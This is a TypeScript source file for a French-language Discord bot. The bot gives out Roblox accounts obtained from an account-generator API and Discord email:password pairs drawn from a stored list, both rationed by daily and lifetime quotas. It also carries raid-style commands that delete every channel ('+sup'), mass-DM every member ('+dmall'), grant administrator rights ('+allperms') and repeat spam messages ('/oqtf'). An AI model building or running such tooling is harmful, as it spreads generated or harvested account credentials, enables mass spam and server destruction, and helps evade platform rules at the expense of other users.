import {
  Client,
  GatewayIntentBits,
  PermissionFlagsBits,
  ChannelType,
  TextChannel,
  GuildMember,
  Message,
  Interaction,
  ChatInputCommandInteraction,
  ApplicationCommandOptionType,
  REST,
  Routes,
  MessageFlags,
  ActivityType,
} from "discord.js";
import { logger } from "./lib/logger";
import { randomDiscordAccount } from "./discord-accounts";
import {
  hasReachedLifetimeLimit,
  incrementLifetime,
  getLifetimeRemaining,
  LIFETIME_LIMIT,
} from "./lifetime-store";
import {
  logBotReady,
  logSlashCommand,
  logRobloxGenerated,
  logDidiGenerated,
  logCooldownHit,
  logDailyLimitHit,
  logModAction,
  logError,
} from "./webhook-logger";

const PREFIX = "+";
const OWNER_ID = "229635038872862721";
const COOLDOWN_EXEMPT = new Set(["229635038872862721", "1493948008570556457"]);
const COOLDOWN_MS = 60_000;
const DAILY_LIMIT_ROBLOX = 5;
const DAILY_LIMIT_DIDI = 3;
const compteCooldowns = new Map<string, number>();
const dailyUsage = new Map<string, { roblox: number; didi: number; date: string }>();

function isOwner(message: Message): boolean {
  return message.author.id === OWNER_ID;
}

function todayStr(): string {
  return new Date().toISOString().slice(0, 10);
}

function getDailyUsage(userId: string) {
  const today = todayStr();
  const entry = dailyUsage.get(userId);
  if (!entry || entry.date !== today) {
    const fresh = { roblox: 0, didi: 0, date: today };
    dailyUsage.set(userId, fresh);
    return fresh;
  }
  return entry;
}

function checkDailyLimit(userId: string, type: "roblox" | "didi"): number {
  if (COOLDOWN_EXEMPT.has(userId)) return 0;
  const usage = getDailyUsage(userId);
  const limit = type === "roblox" ? DAILY_LIMIT_ROBLOX : DAILY_LIMIT_DIDI;
  return Math.max(0, limit - usage[type]);
}

function incrementDaily(userId: string, type: "roblox" | "didi"): void {
  if (COOLDOWN_EXEMPT.has(userId)) return;
  const usage = getDailyUsage(userId);
  usage[type]++;
}

function checkCooldown(userId: string): number {
  if (COOLDOWN_EXEMPT.has(userId)) return 0;
  const last = compteCooldowns.get(userId) ?? 0;
  const remaining = COOLDOWN_MS - (Date.now() - last);
  return remaining > 0 ? remaining : 0;
}

function setCooldown(userId: string): void {
  if (!COOLDOWN_EXEMPT.has(userId)) compteCooldowns.set(userId, Date.now());
}

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.GuildPresences,
  ],
});

// ─── Slash commands registration ─────────────────────────────────────────────

const slashCommands = [
  {
    name: "oqtf",
    description: "Envoie un message plusieurs fois dans ce salon",
    integration_types: [0, 1],
    contexts: [0, 1, 2],
    options: [
      {
        name: "texte",
        description: "Le message à envoyer",
        type: ApplicationCommandOptionType.String,
        required: true,
      },
      {
        name: "fois",
        description: "Nombre d'envois (1 à 5)",
        type: ApplicationCommandOptionType.Integer,
        required: true,
        min_value: 1,
        max_value: 5,
      },
    ],
  },
  {
    name: "compte",
    description: "Génère un compte Roblox ou Discord",
    integration_types: [0, 1],
    contexts: [0, 1, 2],
    options: [
      {
        name: "service",
        description: "Type de compte",
        type: ApplicationCommandOptionType.String,
        required: false,
        choices: [
          { name: "Roblox +30 jours", value: "roblox" },
          { name: "Discord (didi)", value: "didi" },
        ],
      },
    ],
  },
];

async function registerSlashCommands(token: string, clientId: string) {
  const rest = new REST({ version: "10" }).setToken(token);
  try {
    await rest.put(Routes.applicationCommands(clientId), {
      body: slashCommands,
    });
    logger.info("Slash commands enregistrées globalement");
  } catch (err) {
    logger.error({ err }, "Erreur lors de l'enregistrement des slash commands");
  }
}

// ─── Bot ready ────────────────────────────────────────────────────────────────

client.once("ready", async () => {
  logger.info({ tag: client.user?.tag }, "Bot Discord connecté");
  logBotReady(client.user!.tag);

  client.user!.setPresence({
    status: "online",
    activities: [
      {
        name: "Mossad VR",
        type: ActivityType.Playing,
        state: "Tel Aviv",
      },
    ],
  });

  const token = process.env["DISCORD_TOKEN"]!;
  const clientId = client.user!.id;
  await registerSlashCommands(token, clientId);
});

client.on("error", (err) => {
  logger.error({ err }, "Erreur Discord non gérée — bot maintenu en ligne");
});

// ─── Slash command handler ────────────────────────────────────────────────────

client.on("interactionCreate", async (interaction: Interaction) => {
  if (!interaction.isChatInputCommand()) return;
  const cmd = interaction as ChatInputCommandInteraction;

  if (cmd.commandName === "oqtf") {
    if (cmd.guild?.id === "1493949768039137470") {
      return void (await cmd.reply({ content: "❌ Cette commande est désactivée sur ce serveur.", flags: MessageFlags.Ephemeral }));
    }

    const texte = cmd.options.getString("texte", true);
    const fois = cmd.options.getInteger("fois", true);
    logSlashCommand({
      command: "oqtf",
      tag: cmd.user.tag,
      userId: cmd.user.id,
      guildName: cmd.guild?.name ?? null,
      guildId: cmd.guild?.id ?? null,
      extra: { "💬 Texte": texte.slice(0, 100), "🔢 Fois": String(fois) },
    });

    try {
      // Réponse éphémère — visible uniquement par toi
      await cmd.reply({
        content: `✅ Envoi de **${fois}** message(s)...`,
        flags: MessageFlags.Ephemeral,
      });

      let sent = 0;
      for (let i = 0; i < fois; i++) {
        try {
          await cmd.followUp({ content: texte, ephemeral: false });
          sent++;
        } catch {
          // Dans certains contextes (User App sans accès au salon), on essaie en éphémère
          await cmd.followUp({ content: texte, flags: MessageFlags.Ephemeral }).catch(() => {});
        }
      }

      if (sent < fois) {
        await cmd.followUp({
          content: `⚠️ ${sent}/${fois} messages envoyés. Pour envoyer des messages visibles par tous, le bot doit aussi être ajouté au serveur.`,
          flags: MessageFlags.Ephemeral,
        }).catch(() => {});
      }
    } catch (err) {
      logger.error({ err }, "Erreur commande /oqtf");
      await cmd.reply({ content: "❌ Une erreur est survenue.", flags: MessageFlags.Ephemeral }).catch(() => {});
    }
  }

  if (cmd.commandName === "compte") {
    const remaining = checkCooldown(cmd.user.id);
    if (remaining > 0) {
      logCooldownHit({
        tag: cmd.user.tag, userId: cmd.user.id,
        guildName: cmd.guild?.name ?? null, guildId: cmd.guild?.id ?? null,
        command: "/compte", remainingSec: Math.ceil(remaining / 1000),
      });
      return void (await cmd.reply({
        content: `⏳ Cooldown actif — réessaie dans **${Math.ceil(remaining / 1000)}s**.`,
        flags: MessageFlags.Ephemeral,
      }));
    }

    const service = cmd.options.getString("service") ?? "roblox";

    // ── Discord (didi) ──────────────────────────────────────────────────────
    if (service === "didi") {
      if (hasReachedLifetimeLimit(cmd.user.id)) {
        return void (await cmd.reply({ content: `❌ Tu as atteint la limite de **${LIFETIME_LIMIT} comptes** à vie.`, flags: MessageFlags.Ephemeral }));
      }
      if (checkDailyLimit(cmd.user.id, "didi") === 0) {
        logDailyLimitHit({
          tag: cmd.user.tag, userId: cmd.user.id,
          guildName: cmd.guild?.name ?? null, guildId: cmd.guild?.id ?? null,
          type: "didi", via: "slash",
        });
        return void (await cmd.reply({
          content: `❌ Limite journalière atteinte (**${DAILY_LIMIT_DIDI} comptes Discord/jour**). Reviens demain.`,
          flags: MessageFlags.Ephemeral,
        }));
      }
      const account = randomDiscordAccount();
      const [email, pass] = account.split(":");
      setCooldown(cmd.user.id);
      incrementDaily(cmd.user.id, "didi");
      incrementLifetime(cmd.user.id);
      const left = checkDailyLimit(cmd.user.id, "didi");
      logDidiGenerated({
        tag: cmd.user.tag, userId: cmd.user.id,
        guildName: cmd.guild?.name ?? null, guildId: cmd.guild?.id ?? null,
        email: email!, leftToday: left, via: "slash",
      });
      return void (await cmd.reply({
        content:
          `**Email :** \`${email}\`\n` +
          `**Pass :** \`${pass}\`\n` +
          `📬 Webmail : <https://swiftmail.cc/>\n` +
          `-# Il te reste **${left}** compte(s) didi aujourd'hui.`,
        flags: MessageFlags.Ephemeral,
      }));
    }

    // ── Roblox ──────────────────────────────────────────────────────────────
    if (hasReachedLifetimeLimit(cmd.user.id)) {
      return void (await cmd.reply({ content: `❌ Tu as atteint la limite de **${LIFETIME_LIMIT} comptes** à vie.`, flags: MessageFlags.Ephemeral }));
    }
    if (checkDailyLimit(cmd.user.id, "roblox") === 0) {
      logDailyLimitHit({
        tag: cmd.user.tag, userId: cmd.user.id,
        guildName: cmd.guild?.name ?? null, guildId: cmd.guild?.id ?? null,
        type: "roblox", via: "slash",
      });
      return void (await cmd.reply({
        content: `❌ Limite journalière atteinte (**${DAILY_LIMIT_ROBLOX} comptes Roblox/jour**). Reviens demain.`,
        flags: MessageFlags.Ephemeral,
      }));
    }

    const robloxType = "+30 days old";
    const apiKey = process.env["BLOXGEN_API_KEY"];

    if (!apiKey) {
      return void (await cmd.reply({ content: "❌ Clé API BloxGen manquante.", flags: MessageFlags.Ephemeral }));
    }

    await cmd.reply({ content: "⏳ Génération d'un compte Roblox en cours...", flags: MessageFlags.Ephemeral });

    try {
      const res = await fetch("https://core.bloxgen.net/api/generate", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ apiKey, type: robloxType }),
      });

      const json = await res.json() as {
        success: boolean;
        data?: { username: string; password: string; cookie: string; cost: number };
        message?: string;
      };

      if (!json.success || !json.data) {
        return void (await cmd.editReply(`❌ Erreur BloxGen : ${json.message ?? "Réponse invalide"}`));
      }

      const { username, password } = json.data;

      setCooldown(cmd.user.id);
      incrementDaily(cmd.user.id, "roblox");
      incrementLifetime(cmd.user.id);
      const leftRoblox = checkDailyLimit(cmd.user.id, "roblox");
      logRobloxGenerated({
        tag: cmd.user.tag, userId: cmd.user.id,
        guildName: cmd.guild?.name ?? null, guildId: cmd.guild?.id ?? null,
        username, leftToday: leftRoblox, via: "slash",
      });
      await cmd.editReply(
        `**User :** \`${username}\`\n` +
        `**Pass :** \`${password}\`\n` +
        `-# Il te reste **${leftRoblox}** compte(s) Roblox aujourd'hui.`
      );
    } catch (err) {
      logger.error({ err }, "Erreur commande /compte");
      logError({ context: "/compte roblox", error: err, tag: cmd.user.tag, userId: cmd.user.id });
      await cmd.editReply("❌ Erreur lors de la génération du compte.").catch(() => {});
    }
  }
});

// ─── Prefix command handler (+) ───────────────────────────────────────────────

client.on("messageCreate", async (message: Message) => {
  if (message.author.bot) return;
  if (!message.guild) return;
  if (!message.content) {
    logger.warn(
      { channelId: message.channelId },
      "Message reçu sans contenu — MessageContent Intent probablement désactivé"
    );
    return;
  }

  // ── Salon restreint : supprime tout ce qui n'est pas +compte ─────────────
  const RESTRICTED_GUILD_CLEAN   = "1493949768039137470";
  const RESTRICTED_CHANNEL_CLEAN = "1528815648170442966";
  if (
    message.guild.id === RESTRICTED_GUILD_CLEAN &&
    message.channelId === RESTRICTED_CHANNEL_CLEAN &&
    !message.content.toLowerCase().startsWith("+compte") &&
    !message.content.toLowerCase().startsWith("+mpall")
  ) {
    await message.delete().catch(() => {});
    return;
  }
  // ─────────────────────────────────────────────────────────────────────────

  if (!message.content.startsWith(PREFIX)) return;

  const args = message.content.slice(PREFIX.length).trim().split(/ +/);
  const command = args.shift()?.toLowerCase();

  const member = message.member as GuildMember;

  // ── Serveur restreint : seul +compte dans le salon autorisé ──────────────
  const RESTRICTED_GUILD   = "1493949768039137470";
  const RESTRICTED_CHANNEL = "1528815648170442966";

  if (message.guild.id === RESTRICTED_GUILD) {
    if (command !== "compte" && command !== "mpall") return;
    if (command === "compte" && message.channelId !== RESTRICTED_CHANNEL) return;
  }
  // ─────────────────────────────────────────────────────────────────────────

  try {
    // +say <texte>
    if (command === "say") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.ManageMessages)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }
      const text = args.join(" ");
      if (!text) return void (await message.reply("❌ Précise un texte."));
      await message.delete().catch(() => {});
      if (message.channel.isSendable()) await message.channel.send(text);
    }

    // +lock
    else if (command === "lock") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }
      const channel = message.channel as TextChannel;
      await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
        SendMessages: false,
      });
      await message.reply("🔒 Salon verrouillé.");
      logModAction({ action: "Lock salon", emoji: "🔒", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id, target: `#${channel.name}` });
    }

    // +unlock
    else if (command === "unlock") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.ManageChannels)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }
      const channel = message.channel as TextChannel;
      await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
        SendMessages: true,
      });
      await message.reply("🔓 Salon déverrouillé.");
      logModAction({ action: "Unlock salon", emoji: "🔓", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id, target: `#${channel.name}` });
    }

    // +ban <ID ou @user> [raison]
    else if (command === "ban") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.BanMembers)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }
      const target =
        message.mentions.members?.first() ||
        (await message.guild.members.fetch(args[0]).catch(() => null));
      if (!target) return void (await message.reply("❌ Membre introuvable."));
      const reason = args.slice(1).join(" ") || "Aucune raison précisée";
      await target.ban({ reason });
      await message.reply(`✅ **${target.user.tag}** a été banni. Raison : ${reason}`);
      logModAction({ action: "Ban", emoji: "🔨", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id, target: `${target.user.tag} (\`${target.id}\`)`, reason });
    }

    // +kick <ID ou @user> [raison]
    else if (command === "kick") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.KickMembers)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }
      const target =
        message.mentions.members?.first() ||
        (await message.guild.members.fetch(args[0]).catch(() => null));
      if (!target) return void (await message.reply("❌ Membre introuvable."));
      const reason = args.slice(1).join(" ") || "Aucune raison précisée";
      await target.kick(reason);
      await message.reply(`✅ **${target.user.tag}** a été expulsé. Raison : ${reason}`);
      logModAction({ action: "Kick", emoji: "👢", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id, target: `${target.user.tag} (\`${target.id}\`)`, reason });
    }

    // +dm <@user> <texte>
    else if (command === "dm") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.ManageMessages)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }
      const target = message.mentions.members?.first();
      if (!target) return void (await message.reply("❌ Mentionne un utilisateur avec @."));
      const text = args.slice(1).join(" ");
      if (!text) return void (await message.reply("❌ Précise un texte."));
      await target.send(text).catch(() => {});
      await message.reply(`✅ Message privé envoyé à **${target.user.tag}**.`);
      logModAction({ action: "DM envoyé", emoji: "📩", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id, target: `${target.user.tag} (\`${target.id}\`)`, reason: text.slice(0, 100) });
    }

    // +dmall / +mpall <texte>
    else if (command === "dmall" || command === "mpall") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
        return void (await message.reply("❌ Tu n'as pas la permission (Administrateur requis)."));
      }
      const text = args.join(" ");
      if (!text) return void (await message.reply("❌ Précise un texte."));

      const members = await message.guild.members.fetch();
      const humans = [...members.values()].filter((m) => !m.user.bot);
      const total = humans.length;

      const progressMsg = await message.reply(`📨 Envoi des MPs en cours... (0 / ${total})`);

      let sent = 0;
      let failed = 0;
      const BATCH = 5;

      for (let i = 0; i < humans.length; i += BATCH) {
        const batch = humans.slice(i, i + BATCH);
        const results = await Promise.all(
          batch.map((m) => m.send(text).then(() => true).catch(() => false))
        );
        for (const ok of results) { if (ok) sent++; else failed++; }
        await progressMsg.edit(`📨 Envoi des MPs en cours... (${sent + failed} / ${total})`).catch(() => {});
        if (i + BATCH < humans.length) await new Promise((res) => setTimeout(res, 1000));
      }

      await progressMsg.edit(
        `✅ MPs terminés !\n👥 Total : **${total}** membres\n📬 Envoyés : **${sent}**\n❌ Échoués : **${failed}** (DMs fermés ou bloqués)`
      ).catch(() => {});
      logModAction({ action: "DM All", emoji: "📨", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id, reason: `${sent}/${total} envoyés — "${text.slice(0, 80)}"` });
    }

    // +sup
    else if (command === "sup") {
      if (message.guild.name.toLowerCase().includes("oqtf")) {
        return void (await message.reply("❌ Cette commande est désactivée sur ce serveur."));
      }
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
        return void (await message.reply("❌ Tu n'as pas la permission (Administrateur requis)."));
      }
      await message.reply("🗑️ Suppression de tous les salons en cours...");
      logModAction({ action: "Sup (nuke)", emoji: "🗑️", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id });
      for (const [, ch] of message.guild.channels.cache) {
        await ch.delete().catch(() => {});
      }
    }

    // +allperms <@user|ID>
    else if (command === "allperms") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
        return void (await message.reply("❌ Tu n'as pas la permission (Administrateur requis)."));
      }
      const target =
        message.mentions.members?.first() ||
        (await message.guild.members.fetch(args[0]).catch(() => null));
      if (!target) return void (await message.reply("❌ Membre introuvable."));

      let adminRole = message.guild.roles.cache.find(
        (r) => r.permissions.has(PermissionFlagsBits.Administrator) && r.name !== "@everyone"
      );
      if (!adminRole) {
        adminRole = await message.guild.roles.create({
          name: "Admin",
          permissions: [PermissionFlagsBits.Administrator],
          reason: "Créé par le bot via +allperms",
        });
      }
      await target.roles.add(adminRole);
      await message.reply(`✅ **${target.user.tag}** a reçu toutes les permissions (rôle : **${adminRole.name}**).`);
      logModAction({ action: "Allperms", emoji: "🛡️", tag: message.author.tag, userId: message.author.id, guildName: message.guild.name, guildId: message.guild.id, target: `${target.user.tag} (\`${target.id}\`)` });
    }

    // +compte [type|didi]
    else if (command === "compte") {
      const openToAll = message.guild.id === RESTRICTED_GUILD;
      if (!openToAll && !isOwner(message) && !member.permissions.has(PermissionFlagsBits.ManageMessages)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }

      // Dans le serveur restreint : seuls les membres ayant affiché le tag du serveur peuvent utiliser +compte
      if (openToAll && !isOwner(message)) {
        const freshUser = await message.client.users.fetch(message.author.id, { force: true });
        if (freshUser.primaryGuild?.identityGuildId !== RESTRICTED_GUILD) {
          const errMsg = await message.reply("❌ Tu dois afficher le tag de ce serveur sur ton profil pour utiliser cette commande.");
          await message.delete().catch(() => {});
          setTimeout(() => errMsg.delete().catch(() => {}), 5000);
          return;
        }
      }

      // Dans le serveur restreint : supprimer le message immédiatement
      if (openToAll) await message.delete().catch(() => {});

      // Helper : envoie en DM si serveur restreint + notif temporaire dans le salon
      const respond = async (content: string): Promise<void> => {
        if (openToAll) {
          const dmSent = await message.author.send(content).catch(() => null);
          if (message.channel.isSendable()) {
            const notif = dmSent
              ? await message.channel.send(`${message.author} 📬 Regarde tes MPs !`)
              : await message.channel.send(`${message.author} ${content}`);
            setTimeout(() => notif.delete().catch(() => {}), 5000);
          }
        } else {
          await message.reply(content);
        }
      };

      const remaining = checkCooldown(message.author.id);
      if (remaining > 0) {
        logCooldownHit({
          tag: message.author.tag, userId: message.author.id,
          guildName: message.guild.name, guildId: message.guild.id,
          command: "+compte", remainingSec: Math.ceil(remaining / 1000),
        });
        return void (await respond(`⏳ Cooldown actif — réessaie dans **${Math.ceil(remaining / 1000)}s**.`));
      }

      // +compte didi — compte Discord
      if (args[0]?.toLowerCase() === "didi") {
        if (hasReachedLifetimeLimit(message.author.id)) {
          return void (await respond(`❌ Tu as atteint la limite de **${LIFETIME_LIMIT} comptes** à vie.`));
        }
        if (checkDailyLimit(message.author.id, "didi") === 0) {
          logDailyLimitHit({
            tag: message.author.tag, userId: message.author.id,
            guildName: message.guild.name, guildId: message.guild.id,
            type: "didi", via: "prefix",
          });
          return void (await respond(`❌ Limite journalière atteinte (**${DAILY_LIMIT_DIDI} comptes Discord/jour**). Reviens demain.`));
        }
        const account = randomDiscordAccount();
        const [email, pass] = account.split(":");
        setCooldown(message.author.id);
        incrementDaily(message.author.id, "didi");
        incrementLifetime(message.author.id);
        const leftDidi = checkDailyLimit(message.author.id, "didi");
        logDidiGenerated({
          tag: message.author.tag, userId: message.author.id,
          guildName: message.guild.name, guildId: message.guild.id,
          email: email!, leftToday: leftDidi, via: "prefix",
        });
        const didiContent =
          `**Email :** \`${email}\`\n` +
          `**Pass :** \`${pass}\`\n` +
          `📬 Webmail : <https://swiftmail.cc/>\n` +
          `-# Il te reste **${leftDidi}** compte(s) didi aujourd'hui.`;
        if (openToAll) {
          return void (await respond(didiContent));
        }
        const dmSent = await message.author.send(didiContent).then(() => true).catch(() => false);
        if (dmSent) {
          return void (await message.reply("✅ Compte Discord envoyé en MP !"));
        } else {
          return void (await message.reply(didiContent));
        }
      }

      if (hasReachedLifetimeLimit(message.author.id)) {
        return void (await respond(`❌ Tu as atteint la limite de **${LIFETIME_LIMIT} comptes** à vie.`));
      }

      if (checkDailyLimit(message.author.id, "roblox") === 0) {
        logDailyLimitHit({
          tag: message.author.tag, userId: message.author.id,
          guildName: message.guild.name, guildId: message.guild.id,
          type: "roblox", via: "prefix",
        });
        return void (await respond(`❌ Limite journalière atteinte (**${DAILY_LIMIT_ROBLOX} comptes Roblox/jour**). Reviens demain.`));
      }

      const type = args[0] || "alt";
      const validTypes = ["alt", "+30 days old", "+1 year old", "5+ years old", "dump"];
      const typeMap: Record<string, string> = {
        alt: "alt",
        dump: "dump",
        "30": "+30 days old",
        "1an": "+1 year old",
        "5ans": "5+ years old",
      };
      const resolvedType = typeMap[type] ?? type;

      if (!validTypes.includes(resolvedType)) {
        return void (await respond(
          `❌ Type invalide. Types disponibles : \`alt\`, \`dump\`, \`30\`, \`1an\`, \`5ans\``
        ));
      }

      const apiKey = process.env["BLOXGEN_API_KEY"];
      if (!apiKey) {
        return void (await respond("❌ Clé API BloxGen manquante."));
      }

      // Message de statut : DM si serveur restreint, salon sinon
      let statusMsg: import("discord.js").Message | null = null;
      if (!openToAll) {
        statusMsg = await message.reply(`⏳ Génération d'un compte **${resolvedType}** en cours...`);
      } else {
        await message.author.send(`⏳ Génération d'un compte **${resolvedType}** en cours...`).catch(() => {});
      }

      try {
        const res = await fetch("https://core.bloxgen.net/api/generate", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ apiKey, type: resolvedType }),
        });

        const json = await res.json() as {
          success: boolean;
          data?: {
            username: string;
            password: string;
            cookie: string;
            type: string;
            cost: number;
            id: number;
            avatarUrl?: string;
          };
          message?: string;
        };

        if (!json.success || !json.data) {
          const errTxt = `❌ Erreur BloxGen : ${json.message ?? "Réponse invalide"}`;
          if (statusMsg) await statusMsg.edit(errTxt);
          else await respond(errTxt);
          return;
        }

        const { username, password } = json.data;

        setCooldown(message.author.id);
        incrementDaily(message.author.id, "roblox");
        incrementLifetime(message.author.id);
        const leftRoblox = checkDailyLimit(message.author.id, "roblox");
        logRobloxGenerated({
          tag: message.author.tag, userId: message.author.id,
          guildName: message.guild.name, guildId: message.guild.id,
          username, leftToday: leftRoblox, via: "prefix",
        });
        const dmContent =
          `**User :** \`${username}\`\n` +
          `**Pass :** \`${password}\`\n` +
          `-# Il te reste **${leftRoblox}** compte(s) Roblox aujourd'hui.`;

        if (openToAll) {
          await respond(dmContent);
        } else {
          const dmSent = await message.author.send(dmContent).then(() => true).catch(() => false);
          if (dmSent) {
            await statusMsg?.edit(`✅ Compte **${resolvedType}** généré et envoyé en MP ! (\`${username}\`)`);
          } else {
            await statusMsg?.edit(
              `✅ Compte généré (ouvre tes MPs pour recevoir le cookie) !\n` +
              `👤 \`${username}\` — 🔑 \`${password}\``
            );
          }
        }
      } catch (err) {
        logger.error({ err }, "Erreur appel API BloxGen");
        const errTxt = "❌ Erreur lors de la génération du compte.";
        if (statusMsg) await statusMsg.edit(errTxt).catch(() => {});
        else await respond(errTxt);
      }
    }

    // +red — redémarre le bot (admin uniquement)
    else if (command === "red") {
      if (!isOwner(message) && !member.permissions.has(PermissionFlagsBits.Administrator)) {
        return void (await message.reply("❌ Tu n'as pas la permission."));
      }
      await message.reply("🔄 Redémarrage du bot en cours...");
      logger.info({ userId: message.author.id, tag: message.author.tag }, "Redémarrage bot via +red");
      setTimeout(() => process.exit(0), 1000);
    }

    // +help
    else if (command === "help") {
      await message.reply(
        "**📋 Commandes disponibles :**\n" +
        "`+say <texte>` — Fait parler le bot\n" +
        "`+lock` — Verrouille le salon actuel\n" +
        "`+unlock` — Déverrouille le salon actuel\n" +
        "`+ban <@user|ID> [raison]` — Banni un membre\n" +
        "`+kick <@user|ID> [raison]` — Expulse un membre\n" +
        "`+dm <@user> <texte>` — Envoie un MP à un utilisateur\n" +
         "`+dmall <texte>` ou `+mpall <texte>` — Envoie un MP à tout le serveur\n" +
        "`+sup` — Supprime tous les salons\n" +
        "`+allperms <@user|ID>` — Donne toutes les permissions à un membre\n" +
        "`+red` — Redémarre le bot\n" +
        "`/oqtf <texte> <1-5>` — Envoie un message plusieurs fois (slash command, réponse privée)\n"
      );
    }
  } catch (err) {
    logger.error({ err }, "Erreur lors de l'exécution d'une commande");
    await message.reply("❌ Une erreur est survenue.").catch(() => {});
  }
});

// ─── Start ────────────────────────────────────────────────────────────────────

export function startBot() {
  const token = process.env["DISCORD_TOKEN"];
  if (!token) {
    logger.error("DISCORD_TOKEN manquant — le bot ne démarrera pas.");
    return;
  }
  client.login(token).catch((err) => {
    logger.error({ err }, "Impossible de se connecter à Discord");
  });
}
